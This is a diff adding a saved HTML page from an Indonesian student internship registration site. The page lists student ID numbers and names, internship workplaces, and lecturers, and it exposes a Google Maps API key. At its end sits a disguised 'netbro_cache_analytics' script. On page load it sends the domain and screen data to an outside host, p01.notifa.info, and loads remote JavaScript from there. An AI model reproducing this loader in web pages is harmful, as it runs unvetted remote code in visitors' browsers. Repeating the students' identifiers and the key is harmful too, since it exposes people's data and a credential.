@@ -1,0 +1,980 @@
+<!doctype html>
+<html lang="en">
+
+<!-- Mirrored from themerail.com/html/oficiona/home-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Dec 2018 03:37:28 GMT -->
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>S I P B K P</title>
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/bootstrap.min.css">
+
+    <!-- External Css -->
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/fontawesome-all.min.css">
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/themify-icons.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/et-line.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/bootstrap-select.min.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/plyr.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/flag.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/slick.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/owl.carousel.min.css" />
+    <link rel="stylesheet" href="http://localhost:8000/assets/css/jquery.nstSlider.min.css" />
+
+    <!-- Custom Css -->
+    <link rel="stylesheet" type="text/css" href="http://localhost:8000/css/main.css">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:300i,400,500" rel="stylesheet">
+
+    <!-- Favicon -->
+    <link rel="icon" href="http://localhost:8000/images/aknela.png">
+    <link rel="apple-touch-icon" href="http://localhost:8000/images/aknela57x57.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:8000/images/aknela72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:8000/images/aknela114x114.png">
+
+    <!--[if lt IE 9]>
+    <script src="assets/js/html5shiv.min.js"></script>
+    <script src="assets/js/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+    <!-- Header -->
+    <header>
+        <nav class="navbar navbar-expand-xl absolute-nav transparent-nav cp-nav navbar-light bg-light fluid-nav">
+            <a class="navbar-brand" href="index.html">
+                <img src="images/" class="img-fluid" alt="">
+            </a>
+            <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+                aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav ml-auto main-nav">
+                    <li class="menu-item active"><a title="Home" href="/home">Home</a></li>
+                    <li class="menu-item active"><a title="Bimbingan" href="/jurnalmahasiswa">Bimbingan</a></li>
+                    <li class="menu-item active"><a title="Registration" href="/pendaftaran">Pendaftaran</a></li>
+                    <li class="menu-item active"><a title="Hasil Pendaftaran" href="/hasilpendaftaran">Hasil Pendaftaran</a></li>
+                    <li class="menu-item active"><a title="Login" data-toggle="modal" data-target="#exampleModalLong">Admin</a></li>
+                    <li class="menu-item active"><a title="Login" href="/loginuser">Login</a></li>
+                    <li class="menu-item active"><a title="Logout" href="/logoutuser">Logout</a></li>
+                    <li class="menu-item active"></li>
+                    <li class="menu-item active"></li>
+                    <li class="menu-item active"></li>
+                </ul>
+            </div>
+        </nav>
+        <!-- Modal -->
+        <div class="account-entry">
+            <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-hidden="true">
+                <div class="modal-dialog" role="document">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h5 class="modal-title"><i data-feather="user"></i>Login S I P B K P</h5>
+                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true">&times;</span>
+                            </button>
+                        </div>
+                        <div class="modal-body">
+                                                        <form action="/login" method="post">
+                                <input type="hidden" name="_token" value="3bCyqPvr2V4ghhnX88JdQwBzQ4YemMP81jrJaqHR">                                <div class="form-group">
+                                    <input type="username" placeholder="Username" class="form-control" name="username">
+                                </div>
+                                <div class="form-group">
+                                    <input type="password" placeholder="Password" class="form-control" name="password">
+                                </div>
+                                <button class="button primary-bg btn-block">Login</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Header End -->
+
+
+    <!-- Banner -->
+    <div class="banner banner-1 banner-1-bg">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <div class="banner-content">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Banner End -->
+
+    <!-- Search and Filter -->
+
+    <div class="container">
+        <div class="row">
+            <div class="col">
+                <div class="searchAndFilter-block">
+    <div class="searchAndFilter">
+        <form method="post" action="/pendaftaran/kelompoksimpan" enctype="multipart/form-data"
+            class="job-post-form">
+            <input type="hidden" name="_token" value="3bCyqPvr2V4ghhnX88JdQwBzQ4YemMP81jrJaqHR">            <div class="basic-info-input">
+                <div class="text-center">
+                    <h4>
+                        Entry Data
+                    </h4>
+                </div>
+                <div id="information" class="row">
+                    <label class="col-md-8">Nama Mahasiswa 1</label>
+                    <div class="col-md-12">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group">
+                                    <select class="from-control" name="id_mahasiswa">
+                                                                                <option value="6">
+                                            2102157004
+ - AMILATUL FAIZAH
+
+                                        </option>
+                                                                                <option value="7">
+                                            2102157005
+ - BEZALIEL KOKOH SUMARGO
+                                        </option>
+                                                                                <option value="8">
+                                            2102157006
+ - DEBY NUR ANDINI
+
+                                        </option>
+                                                                                <option value="9">
+                                            2102157007
+ - DEWI SITI MASITOH
+
+                                        </option>
+                                                                                <option value="11">
+                                            2102157009
+ - ELLY FITRIANI
+
+                                        </option>
+                                                                                <option value="13">
+                                            2102157011
+ - EVA MUZDHALIFAH
+
+                                        </option>
+                                                                                <option value="15">
+                                            2102157013
+ - FATKHUR ROHMAN
+
+                                        </option>
+                                                                                <option value="16">
+                                            2102157014
+ - GALANG MAHARDIKA AL HISYAM
+
+                                        </option>
+                                                                                <option value="17">
+                                            2102157015
+ - IZZA DIANA MANZILA
+
+                                        </option>
+                                                                                <option value="18">
+                                            2102157016
+ - M. HAIDAR AL-MUTA&#039;AL
+
+                                        </option>
+                                                                                <option value="19">
+                                            2102157017
+ - MOCH. PRAPTA WIJAYA
+
+                                        </option>
+                                                                                <option value="20">
+                                            2102157018
+ - MOCHAMAD ASRORI 
+
+                                        </option>
+                                                                                <option value="21">
+                                            2102157019
+ - MOHAMMAD FARIZ ARDIANSYAH
+
+                                        </option>
+                                                                                <option value="22">
+                                            2102157020
+ - MUHAMMAD BINCHAR
+
+                                        </option>
+                                                                                <option value="23">
+                                            2102157021
+ - RAHMAD NAFI&#039;UL KHOID
+
+                                        </option>
+                                                                                <option value="24">
+                                            2102157022
+ - ROBIHATUSSHOBAH
+
+                                        </option>
+                                                                                <option value="25">
+                                            2102157023
+ - SHELLA NOFI ANISA
+
+                                        </option>
+                                                                                <option value="26">
+                                            2102157024
+ - SUNANIK HIDAYATI
+
+                                        </option>
+                                                                                <option value="27">
+                                            2102157025
+ - TAUFIQ ISMAIL BARKAH
+
+                                        </option>
+                                                                                <option value="28">
+                                            2102157026
+ - TEGUH TRI CAHYO
+
+                                        </option>
+                                                                                <option value="29">
+                                            2102157027
+ - VENY PUTRI PRATIWI
+
+                                        </option>
+                                                                                <option value="30">
+                                            2102157028
+ - VIVI AYU SETIAWATI
+
+                                        </option>
+                                                                                <option value="31">
+                                            2102157029
+ - WAHYU PRATAMA PUTRA
+
+                                        </option>
+                                                                                <option value="32">
+                                            2102157030
+ - YHONGKI APRILDA
+
+                                        </option>
+                                                                            </select>
+                                    <i class="fa fa-caret-down"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="information" class="row">
+                    <label class="col-md-8">Nama Mahasiswa 2</label>
+                    <div class="col-md-12">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group">
+                                    <select class="form-control" name="id_mahasiswa2">
+                                                                                <option value="6">
+                                            2102157004
+ - AMILATUL FAIZAH
+
+                                        </option>
+                                                                                <option value="7">
+                                            2102157005
+ - BEZALIEL KOKOH SUMARGO
+                                        </option>
+                                                                                <option value="8">
+                                            2102157006
+ - DEBY NUR ANDINI
+
+                                        </option>
+                                                                                <option value="9">
+                                            2102157007
+ - DEWI SITI MASITOH
+
+                                        </option>
+                                                                                <option value="11">
+                                            2102157009
+ - ELLY FITRIANI
+
+                                        </option>
+                                                                                <option value="13">
+                                            2102157011
+ - EVA MUZDHALIFAH
+
+                                        </option>
+                                                                                <option value="15">
+                                            2102157013
+ - FATKHUR ROHMAN
+
+                                        </option>
+                                                                                <option value="16">
+                                            2102157014
+ - GALANG MAHARDIKA AL HISYAM
+
+                                        </option>
+                                                                                <option value="17">
+                                            2102157015
+ - IZZA DIANA MANZILA
+
+                                        </option>
+                                                                                <option value="18">
+                                            2102157016
+ - M. HAIDAR AL-MUTA&#039;AL
+
+                                        </option>
+                                                                                <option value="19">
+                                            2102157017
+ - MOCH. PRAPTA WIJAYA
+
+                                        </option>
+                                                                                <option value="20">
+                                            2102157018
+ - MOCHAMAD ASRORI 
+
+                                        </option>
+                                                                                <option value="21">
+                                            2102157019
+ - MOHAMMAD FARIZ ARDIANSYAH
+
+                                        </option>
+                                                                                <option value="22">
+                                            2102157020
+ - MUHAMMAD BINCHAR
+
+                                        </option>
+                                                                                <option value="23">
+                                            2102157021
+ - RAHMAD NAFI&#039;UL KHOID
+
+                                        </option>
+                                                                                <option value="24">
+                                            2102157022
+ - ROBIHATUSSHOBAH
+
+                                        </option>
+                                                                                <option value="25">
+                                            2102157023
+ - SHELLA NOFI ANISA
+
+                                        </option>
+                                                                                <option value="26">
+                                            2102157024
+ - SUNANIK HIDAYATI
+
+                                        </option>
+                                                                                <option value="27">
+                                            2102157025
+ - TAUFIQ ISMAIL BARKAH
+
+                                        </option>
+                                                                                <option value="28">
+                                            2102157026
+ - TEGUH TRI CAHYO
+
+                                        </option>
+                                                                                <option value="29">
+                                            2102157027
+ - VENY PUTRI PRATIWI
+
+                                        </option>
+                                                                                <option value="30">
+                                            2102157028
+ - VIVI AYU SETIAWATI
+
+                                        </option>
+                                                                                <option value="31">
+                                            2102157029
+ - WAHYU PRATAMA PUTRA
+
+                                        </option>
+                                                                                <option value="32">
+                                            2102157030
+ - YHONGKI APRILDA
+
+                                        </option>
+                                                                            </select>
+                                    <i class="fa fa-caret-down"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="information" class="row">
+                    <label class="col-md-8">Nama Mahasiswa 3</label>
+                    <div class="col-md-12">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group">
+                                    <select class="form-control" name="id_mahasiswa3">
+                                                                                <option value="6">
+                                            2102157004
+ - AMILATUL FAIZAH
+
+                                        </option>
+                                                                                <option value="7">
+                                            2102157005
+ - BEZALIEL KOKOH SUMARGO
+                                        </option>
+                                                                                <option value="8">
+                                            2102157006
+ - DEBY NUR ANDINI
+
+                                        </option>
+                                                                                <option value="9">
+                                            2102157007
+ - DEWI SITI MASITOH
+
+                                        </option>
+                                                                                <option value="11">
+                                            2102157009
+ - ELLY FITRIANI
+
+                                        </option>
+                                                                                <option value="13">
+                                            2102157011
+ - EVA MUZDHALIFAH
+
+                                        </option>
+                                                                                <option value="15">
+                                            2102157013
+ - FATKHUR ROHMAN
+
+                                        </option>
+                                                                                <option value="16">
+                                            2102157014
+ - GALANG MAHARDIKA AL HISYAM
+
+                                        </option>
+                                                                                <option value="17">
+                                            2102157015
+ - IZZA DIANA MANZILA
+
+                                        </option>
+                                                                                <option value="18">
+                                            2102157016
+ - M. HAIDAR AL-MUTA&#039;AL
+
+                                        </option>
+                                                                                <option value="19">
+                                            2102157017
+ - MOCH. PRAPTA WIJAYA
+
+                                        </option>
+                                                                                <option value="20">
+                                            2102157018
+ - MOCHAMAD ASRORI 
+
+                                        </option>
+                                                                                <option value="21">
+                                            2102157019
+ - MOHAMMAD FARIZ ARDIANSYAH
+
+                                        </option>
+                                                                                <option value="22">
+                                            2102157020
+ - MUHAMMAD BINCHAR
+
+                                        </option>
+                                                                                <option value="23">
+                                            2102157021
+ - RAHMAD NAFI&#039;UL KHOID
+
+                                        </option>
+                                                                                <option value="24">
+                                            2102157022
+ - ROBIHATUSSHOBAH
+
+                                        </option>
+                                                                                <option value="25">
+                                            2102157023
+ - SHELLA NOFI ANISA
+
+                                        </option>
+                                                                                <option value="26">
+                                            2102157024
+ - SUNANIK HIDAYATI
+
+                                        </option>
+                                                                                <option value="27">
+                                            2102157025
+ - TAUFIQ ISMAIL BARKAH
+
+                                        </option>
+                                                                                <option value="28">
+                                            2102157026
+ - TEGUH TRI CAHYO
+
+                                        </option>
+                                                                                <option value="29">
+                                            2102157027
+ - VENY PUTRI PRATIWI
+
+                                        </option>
+                                                                                <option value="30">
+                                            2102157028
+ - VIVI AYU SETIAWATI
+
+                                        </option>
+                                                                                <option value="31">
+                                            2102157029
+ - WAHYU PRATAMA PUTRA
+
+                                        </option>
+                                                                                <option value="32">
+                                            2102157030
+ - YHONGKI APRILDA
+
+                                        </option>
+                                                                            </select>
+                                    <i class="fa fa-caret-down"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="information" class="row">
+                    <label class="col-md-8">Tempat Kerja Praktek </label>
+                    <div class="col-md-12">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group">
+                                    <select class="form-control" name="id_tempatKP">
+                                                                                <option value="4">
+                                            Al qolam Digital Printing
+                                        </option>
+                                                                                <option value="5">
+                                            Anugrah Foto Copy Lamongan 
+                                        </option>
+                                                                                <option value="6">
+                                            AR TECH Computer
+                                        </option>
+                                                                                <option value="7">
+                                            Aris Video Shooting
+                                        </option>
+                                                                                <option value="8">
+                                            AVS Lamongan
+                                        </option>
+                                                                                <option value="9">
+                                            Badan Pemberdayaan Masyarakat Kabupaten Lmaongan
+                                        </option>
+                                                                                <option value="10">
+                                            Badan Perencanaan Pembangunan Daerah Kabupaten Lamongan 
+                                        </option>
+                                                                                <option value="11">
+                                            Badan Perpustakaan Dan Arsip Daerah Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="12">
+                                            Kominfo Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="13">
+                                            Balai Wartawan Lamongan
+                                        </option>
+                                                                                <option value="14">
+                                            BPBD Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="15">
+                                            Badan Pusat Statistik Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="16">
+                                            Bungart Official 
+                                        </option>
+                                                                                <option value="17">
+                                            Candis Video Shooting
+                                        </option>
+                                                                                <option value="18">
+                                            Ceria Digital Printing Gresik
+                                        </option>
+                                                                                <option value="19">
+                                            CV. Margahayu Lamongan
+                                        </option>
+                                                                                <option value="20">
+                                            CV. AIDRAT Lamongan
+                                        </option>
+                                                                                <option value="21">
+                                            CV.Bintang Arut
+                                        </option>
+                                                                                <option value="22">
+                                            CV. Citra Mandiri
+                                        </option>
+                                                                                <option value="23">
+                                            CV. Dymas Production Lamongan
+                                        </option>
+                                                                                <option value="24">
+                                            CV. Foto Citra Lamongan
+                                        </option>
+                                                                                <option value="25">
+                                            CV. Global Akses
+                                        </option>
+                                                                                <option value="26">
+                                            CV. Multifungsi Computer Sukodadi Lamongan
+                                        </option>
+                                                                                <option value="27">
+                                            CV. Nusa Usaha
+                                        </option>
+                                                                                <option value="28">
+                                            CV. Quick Link
+                                        </option>
+                                                                                <option value="29">
+                                            Dinas Kependudukan dan Pencatatan Sipil Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="30">
+                                            Dinas Koperasi, Industri, dan Perdagangan Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="31">
+                                            Dinas Pemuda Dan Olaraga Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="32">
+                                            Dinas Pendidikan Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="33">
+                                            Dinas Perikanan dan Kelautan Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="34">
+                                            Dinas PU Cipta Karya Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="35">
+                                            Dinas Tenaga Kerja Dan Transmigrasi Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="36">
+                                            DPD Partai Golkar Lamongan
+                                        </option>
+                                                                                <option value="37">
+                                            Elba Video Shooting Lamongan
+                                        </option>
+                                                                                <option value="38">
+                                            Faizdayah Foto Copy dan Computer Bojonegoro
+                                        </option>
+                                                                                <option value="39">
+                                            FIF Lamongan
+                                        </option>
+                                                                                <option value="40">
+                                            FIFA Video Shooting
+                                        </option>
+                                                                                <option value="41">
+                                            Flazznet Pasuruan
+                                        </option>
+                                                                                <option value="42">
+                                            Foto Sambi Sugio Lamongan
+                                        </option>
+                                                                                <option value="43">
+                                            Galaxy Komputer Lamongan
+                                        </option>
+                                                                                <option value="44">
+                                            Hasan Group
+                                        </option>
+                                                                                <option value="45">
+                                            Icerush Custom Store
+                                        </option>
+                                                                                <option value="46">
+                                            Innotech Advertising Design Center Lamongan
+                                        </option>
+                                                                                <option value="47">
+                                            Kantor Bangian Humas Dan Protokol Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="48">
+                                            Kantor Kecamatan Mantup Lamongan
+                                        </option>
+                                                                                <option value="49">
+                                            Kantor Kecamatan Pucuk 
+                                        </option>
+                                                                                <option value="50">
+                                            Kantor Kementerian Agama Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="51">
+                                            Kantor Kepala Desa Deket Kulon
+                                        </option>
+                                                                                <option value="52">
+                                            Kantor Kepala Desa Rancangkencono
+                                        </option>
+                                                                                <option value="53">
+                                            Kantor Notaris Corry Belem, SH., Sp.N
+                                        </option>
+                                                                                <option value="54">
+                                            Kantor Sekretariat DPRD Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="55">
+                                            Kharisma Shooting Lamongan
+                                        </option>
+                                                                                <option value="56">
+                                            Klinik Pratama PPSD Lamongan
+                                        </option>
+                                                                                <option value="57">
+                                            Kantor Pengolahan Data Elektronik (KPDE) Kabupaten Lamongan
+                                        </option>
+                                                                                <option value="58">
+                                            KSP Sentosa Makmur
+                                        </option>
+                                                                                <option value="59">
+                                            L Tech Computindo Lamongan
+                                        </option>
+                                                                                <option value="60">
+                                            WORLDWIDE (Kursus Bahasa Inggris Lamongan)
+                                        </option>
+                                                                                <option value="61">
+                                            Localindo Production Lamongan
+                                        </option>
+                                                                                <option value="62">
+                                            Mandala Enterprise Bojonegoro
+                                        </option>
+                                                                                <option value="63">
+                                            MI Islam Pucangro Kalitengah
+                                        </option>
+                                                                                <option value="64">
+                                            MI Mambaul Ma&#039;arif Lamongan
+                                        </option>
+                                                                                <option value="65">
+                                            MOS Computer Lamongan
+                                        </option>
+                                                                                <option value="66">
+                                            MPS KUD Tani Mulyo Lamongan
+                                        </option>
+                                                                                <option value="67">
+                                            M-TAQO Computer
+                                        </option>
+                                                                                <option value="68">
+                                            MTS Ma&#039;arif 26 Ishlahul Masalik
+                                        </option>
+                                                                                <option value="69">
+                                            MTS Putra Putri Lamongan
+                                        </option>
+                                                                                <option value="70">
+                                            MTS/MA Sunan Ampel Kebet Lamongan
+                                        </option>
+                                                                                <option value="71">
+                                            Nirwana Digital Print
+                                        </option>
+                                                                                <option value="72">
+                                            PD. BPR Bank Daerah Lamongan
+                                        </option>
+                                                                                <option value="73">
+                                            PD. BPR Bank Daerah Lamongan Unit Pelayanan Sukodadi
+                                        </option>
+                                                                                <option value="74">
+                                            Pelabuhan Perikanan Nusantara Brondong
+                                        </option>
+                                                                                <option value="75">
+                                            Percetakan dan Foto Copy Lancar Lamongan
+                                        </option>
+                                                                                <option value="76">
+                                            Percetakan Hitam Putih Lamongan
+                                        </option>
+                                                                            </select>
+                                    <i class="fa fa-caret-down"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="information" class="row">
+                    <label class="col-md-8">Prodi </label>
+                    <div class="col-md-12">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group">
+                                    <select class="form-control" name="id_prodi">
+                                                                                <option value="1">
+                                            Teknik Informatika
+                                        </option>
+                                                                                <option value="2">
+                                            Multimedia Broadcasting
+                                        </option>
+                                                                            </select>
+                                    <i class="fa fa-caret-down"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="information" class="row">
+                    <label class="col-md-8">Dosen Pembimbing</label>
+                    <div class="col-md-12">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group">
+                                    <select class="form-control" name="id_dosen">
+                                                                                <option value="3">
+                                            Drs. Moch. Nadhor, M.Pd.
+                                        </option>
+                                                                                <option value="4">
+                                            Fajariati Herina Putri, S.Kom.
+                                        </option>
+                                                                                <option value="5">
+                                            Isman Hadi, S.Kom, S.ST.
+                                        </option>
+                                                                                <option value="6">
+                                            Moh. Azwar Taufiq, S.Kom.
+                                        </option>
+                                                                                <option value="8">
+                                            Drs. Purwandi
+                                        </option>
+                                                                                <option value="9">
+                                            Sampurno, S.PdI.
+                                        </option>
+                                                                                <option value="10">
+                                            Much. Chafid, S.Kom.
+                                        </option>
+                                                                                <option value="11">
+                                            Ervina Yuniati Rokhmah, S.ST.
+                                        </option>
+                                                                                <option value="12">
+                                            Yanuangga Gala Hartlambang, M.Kom.
+                                        </option>
+                                                                                <option value="13">
+                                            Abdul Rokhim, M.Kom.
+                                        </option>
+                                                                                <option value="14">
+                                            Nur Nafi&#039;iyah, S.Kom, M.Kom.
+                                        </option>
+                                                                                <option value="15">
+                                            Nurul Fuad, S.Kom, M.Kom.
+                                        </option>
+                                                                                <option value="16">
+                                            Senja Rokhma Kurniawan, S.Kom, S.ST.
+                                        </option>
+                                                                                <option value="17">
+                                            Muhammad Turmudzi, S.Kom.
+                                        </option>
+                                                                                <option value="18">
+                                            Agus Wibowo, S.Kom.
+                                        </option>
+                                                                                <option value="19">
+                                            Yunia Ikawati, S.ST.
+                                        </option>
+                                                                                <option value="20">
+                                            Eva Kurniawaty, S.ST.
+                                        </option>
+                                                                                <option value="21">
+                                            Ratri Cahyaning Winedhar, S.Pd.
+                                        </option>
+                                                                                <option value="22">
+                                            Saniyatul Mawaddah, S.ST.
+                                        </option>
+                                                                            </select>
+                                    <i class="fa fa-caret-down"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="information" class="row">
+                        <label class="col-md-8">Nama Pembimbing Kerja Praktek</label>
+                        <div class="col-md-12">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <div class="form-group">
+                                        <select class="form-control" name="id_pembina">
+                                                                                        <option value="4">
+                                                haque
+                                            </option>
+                                                                                        <option value="5">
+                                                wawan
+                                            </option>
+                                                                                    </select>
+                                        <i class="fa fa-caret-down"></i>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                <div id="Tahun Ajaran">
+                    <label>Tahun Ajaran</label>
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Tahun Ajaran" name="tahun" style="width: 100%">
+                    </div>
+                </div>
+            </div>
+            <div>
+                <button class="button">Simpan</button>
+            </div>
+        </form>
+    </div>
+</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Search and Filter End -->
+    <!-- Top Companies -->
+    <!-- Registration Box End -->
+    <!-- Modal -->
+    <!-- Testimonial -->
+    <!-- Testimonial End -->
+    <!-- NewsLetter -->
+    <!-- NewsLetter End -->
+
+    <!-- Footer -->
+    <div class="footer-bottom-area" style="margin-top: -100px; background-color: #007bff; border-top: 4px solid #17a2b8">
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <div class="footer-bottom">
+                        <div class="row">
+                            <div class="col-xl-4 col-lg-5 order-lg-2">
+                                
+                            </div>
+                            <div class="col-xl-4 col-lg-4 order-lg-1">
+                                <p style="color: #fff;"> &copy; Copyright : Elva Hidayatul Haque</p>
+                            </div>
+                            <div class="col-xl-4 col-lg-3 order-lg-3">
+                                <div class="back-to-top">
+                                    <a href="#" style="color: #fff;">Back to top<i class="fas fa-angle-up"></i></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </footer>
+    <!-- Footer End -->
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="http://localhost:8000/assets/js/jquery.min.js"></script>
+    <script src="http://localhost:8000/assets/js/popper.min.js"></script>
+    <script src="http://localhost:8000/assets/js/bootstrap.min.js"></script>
+    <script src="http://localhost:8000/assets/js/feather.min.js"></script>
+    <script src="http://localhost:8000/assets/js/bootstrap-select.min.js"></script>
+    <script src="http://localhost:8000/assets/js/jquery.nstSlider.min.js"></script>
+    <script src="http://localhost:8000/assets/js/owl.carousel.min.js"></script>
+    <script src="http://localhost:8000/assets/js/visible.js"></script>
+    <script src="http://localhost:8000/assets/js/jquery.countTo.js"></script>
+    <script src="http://localhost:8000/assets/js/chart.js"></script>
+    <script src="http://localhost:8000/assets/js/plyr.js"></script>
+    <script src="http://localhost:8000/assets/js/tinymce.min.js"></script>
+    <script src="http://localhost:8000/assets/js/slick.min.js"></script>
+    <script src="http://localhost:8000/assets/js/jquery.ajaxchimp.min.js"></script>
+
+    <script src="http://localhost:8000/js/custom.js"></script>
+
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyC87gjXWLqrHuLKR0CTV5jNLdP4pEHMhmg"></script>
+    <script src="http://localhost:8000/js/map.js"></script>
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function () {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
+                    "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd71TrJ%2f7jfQ8Doz30tqfIsg%2fy%2fHbA8IkcLdQ9QMajG%2frndYoRzeALCh%2bjDzhLcGzA5varDCdSYt1kqvzuhqO7MN0XewAJBubH005oFwkza6x9bSakZbxLyVJvXvGLPPlLLmveIQREto8Ob1G7FahQwbWTZMLf0w2laqH%2bRLOJZaXYXcSGJCjnu7iEkwdMOCLyuUtN65iCiRMxfEqzoW6ny9N8iUIuga%2brC%2fkVK9Ic%2bxm29u9oFnocQXCjKey1AJxiAxbs88EFqEiQnehlBSdUE1sWb2eBGn65%2bubD3QTTAC3dUzCLyy1NWoSApROcaslrhZHNFQSr89%2fZkRakzupRiBK9K3sFdS97x2P2yahP7RDNjzNkmDoSn7upMVm%2baDKDT74M5d%2baIqb3ARurKrMD3xmXeHYgKGUp2ow0sdubX0W%2bRRmEEDDLJP4ppuN8B0SIMBW27kIpQj3SYrBsM0P2V0Mswj6PpnrvhKEBSMukyy4%3d" +
+                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function () {});
+        };
+
+    </script>
+    </body>
+<!-- Mirrored from themerail.com/html/oficiona/home-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Dec 2018 03:43:19 GMT -->
+
+</html>
